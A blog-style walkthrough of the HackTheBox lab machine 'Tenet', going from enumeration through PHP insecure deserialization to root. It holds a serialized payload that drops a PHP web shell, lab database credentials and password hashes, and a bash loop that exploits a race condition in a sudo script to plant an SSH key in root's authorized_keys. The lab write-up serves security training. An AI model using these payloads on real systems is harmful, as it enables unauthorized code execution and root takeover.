---
permalink: /tenet
layout: post
author: egotisticalSW
title: Tenet
date: 2021-05-22
publish: True

description: "Tenet is a Medium difficulty machine that features an Apache web server with wordpress blog site with few posts. One of the post contains a comment mentioning about the presence of a PHP file along with it's backup. Using serialization, made command execution on the box and made reverse shell. Using Wordpress configuration creds escalate to user Neil. On Further enumeration reveals that this user have root permissions to run a bash script through sudo .The script is writing SSH public keys to the authorized_keys file of the root user and is vulnerable to a race condition. After successful exploitation, attackers can write their own SSH keys to the authorized_keys file and use them to login to the system as root ."
---

# Skills Learned

- Exploitation of an Insecure Deserialisation
- Exploitation of a Race Condition in a Bash script

# Enumeration
## Nmap
* 22
* 80

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 cc:ca:43:d4:4c:e7:4e:bf:26:f4:27:ea:b8:75:a8:f8 (RSA)
|   256 85:f3:ac:ba:1a:6a:03:59:e2:7e:86:47:e7:3e:3c:00 (ECDSA)
|_  256 e7:e9:9a:dd:c3:4a:2f:7a:e1:e0:5d:a2:b0:ca:44:a8 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=6/13%OT=22%CT=1%CU=32202%PV=Y%DS=2%DC=T%G=Y%TM=60C51CC
OS:8%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=10C%TI=Z%CI=Z%TS=A)SEQ(SP=1
OS:06%GCD=1%ISR=10C%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M54DST11NW7%O2=M54DST11NW7%O
OS:3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST11NW7%O6=M54DST11)WIN(W1=FE88%W2=
OS:FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M54DNNSN
OS:W7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%D
OS:F=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O
OS:=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W
OS:=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%R
OS:IPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 21/tcp)
HOP RTT       ADDRESS
1   377.59 ms 10.10.14.1
2   377.67 ms 10.10.10.223

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 82.90 seconds
```

Port 80

![](/Writeups/Tenet/Pasted image 20210613021652.png)

Couldn't find any index pages. We do a `gobuster` to bruteforce to find directories on the machines

```bash
┌[Parrot]─[02:31-13/06]─[/home/aju/CTF/HTB/Tenet]
└╼aju$gobuster dir -u http://10.10.10.223 -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.223
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /opt/SecLists/Discovery/Web-Content/raft-small-words.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/06/13 02:54:32 Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 277]
/.html                (Status: 403) [Size: 277]
/.htm                 (Status: 403) [Size: 277]
/.                    (Status: 200) [Size: 10918]
/wordpress            (Status: 301) [Size: 316] [--> http://10.10.10.223/wordpress/]
```

Gobuster results gives a finding at wordpress

![](/Writeups/Tenet/Pasted image 20210613022612.png)

The doesn't load any css we need to add domain to our host file

![](/Writeups/Tenet/Pasted image 20210613022709.png)

Add tenet.htb to our host file.

![](/Writeups/Tenet/Pasted image 20210613023025.png)

![](/Writeups/Tenet/Pasted image 20210613023208.png)
 
 We got a page. On reading the posts and comments found an interseting comment regarding sator php file and the backup
 
 ![](/Writeups/Tenet/Pasted image 20210613030817.png)
 
 # Foothold
 
 Sator.php can be found at http://10.10.10.223/stator.php 

![](/Writeups/Tenet/Pasted image 20210613030951.png)

We can check for its backup file using gobuster by creating a file named words with sator as content.

```bash
┌[Parrot]─[03:11-13/06]─[/home/aju/CTF/HTB/Tenet]
└╼aju$gobuster dir -u http://10.10.10.223 -w words -d -x php
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.223
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                words
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
2021/06/13 03:12:10 Starting gobuster in directory enumeration mode
===============================================================
/sator.php            (Status: 200) [Size: 63]
/sator.php.bak        (Status: 200) [Size: 514]
                                               
===============================================================
2021/06/13 03:12:20 Finished
===============================================================
```

We can download and examine sator.php.bak

![](/Writeups/Tenet/Pasted image 20210613031555.png)

we can create Serialized Object to get command execution on the machine 

```bash
<?php

class DatabaseExport
{
	public $user_file = 'edg.php';
    public $data = '<?php system($_REQUEST["cmd"]); ?>';
}

$test = new DatabaseExport;
echo (serialize($test));
```

Run the the serialized object

```bash
┌[Parrot]─[04:20-13/06]─[/home/aju/CTF/HTB/Tenet]
└╼aju$php test.php
O:14:"DatabaseExport":2:{s:9:"user_file";s:7:"edg.php";s:4:"data";s:34:"<?php system($_REQUEST["cmd"]); ?>";}
```
 
 Paste the obtained serialized object in the url as parameter for `arepo`
 
 ```php
 http://10.10.10.223/sator.php?arepo=O:14:"DatabaseExport":2:{s:9:"user_file";s:7:"edg.php";s:4:"data";s:34:"<?php system($_REQUEST["cmd"]); ?>";}
 ```

![](/Writeups/Tenet/Pasted image 20210613032702.png)

code execution

![](/Writeups/Tenet/Pasted image 20210613033144.png)

# Reverse Shell

Got a shell

![](/Writeups/Tenet/Pasted image 20210613033923.png)

Reading the config.php will give as database password and username

![](/Writeups/Tenet/Pasted image 20210613034242.png)

|username|password|
|---|---|
|neil|Opera2112|

```php
From mysql we got users and hashes 
+----+-------------+------------------------------------+
| ID | user_login  | user_pass                          |
+----+-------------+------------------------------------+
|  1 | protagonist | $P$BqNNfN07OWdaEfHmGwufBs.b.BebvZ. |
|  2 | neil        | $P$BtFC5SOvjEMFWLE4zq5DWXy7sJPUqM. |
+----+-------------+------------------------------------+
2 rows in set (0.00 sec)
```

Using neil's password we can ssh into machine

![](/Writeups/Tenet/Pasted image 20210613034926.png)

# Privilege Escalation

we can run following without sudo password

```bash
neil@tenet:~$ sudo -l
Matching Defaults entries for neil on tenet:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:

User neil may run the following commands on tenet:
    (ALL : ALL) NOPASSWD: /usr/local/bin/enableSSH.sh
neil@tenet:~$ 
```

The script adds a hardcoded public RSA key to the root user's authorized_keys file. There are three functions in the script, `addKey` , `checkFile` and `checkAdded` .

```bash
#!/bin/bash

checkAdded() {

	sshName=$(/bin/echo $key | /usr/bin/cut -d " " -f 3)

	if [[ ! -z $(/bin/grep $sshName /root/.ssh/authorized_keys) ]]; then

		/bin/echo "Successfully added $sshName to authorized_keys file!"

	else

		/bin/echo "Error in adding $sshName to authorized_keys file!"

	fi

}

checkFile() {

	if [[ ! -s $1 ]] || [[ ! -f $1 ]]; then

		/bin/echo "Error in creating key file!"

		if [[ -f $1 ]]; then /bin/rm $1; fi

		exit 1

	fi

}

addKey() {

	tmpName=$(mktemp -u /tmp/ssh-XXXXXXXX)

	(umask 110; touch $tmpName)

	/bin/echo $key >>$tmpName

	checkFile $tmpName

	/bin/cat $tmpName >>/root/.ssh/authorized_keys

	/bin/rm $tmpName

}

key="ssh-rsa AAAAA3NzaG1yc2GAAAAGAQAAAAAAAQG+AMU8OGdqbaPP/Ls7bXOa9jNlNzNOgXiQh6ih2WOhVgGjqr2449ZtsGvSruYibxN+MQLG59VkuLNU4NNiadGry0wT7zpALGg2Gl3A0bQnN13YkL3AA8TlU/ypAuocPVZWOVmNjGlftZG9AP656hL+c9RfqvNLVcvvQvhNNbAvzaGR2XOVOVfxt+AmVLGTlSqgRXi6/NyqdzG5Nkn9L/GZGa9hcwM8+4nT43N6N31lNhx4NeGabNx33b25lqermjA+RGWMvGN8siaGskvgaSbuzaMGV9N8umLp6lNo5fqSpiGN8MQSNsXa3xXG+kplLn2W+pbzbgwTNN/w0p+Urjbl root@ubuntu"
addKey
checkAdded
```

First the script will create a ssh-file in temp directory. `checkFile` will check the existance of the file then `checkFile` will add the hardcoded ssh  public key to root's `authorized_key` file. Lets create a script for checking the exitance of ssh file using loop and add our public key to the file

```while true; do for file in /tmp/ssh-*; do echo "ssh-rsa BHNY+X0HdMPb2hknWpb2pLaHG4bJCAR+1QicX9C2hDI1g+3AReT583Up22a8a1egnKbZ/L3mbKfSIc=" > $file; done; done
```

![](/Writeups/Tenet/Pasted image 20210613041541.png)

# Root
![](/Writeups/Tenet/Pasted image 20210613041654.png)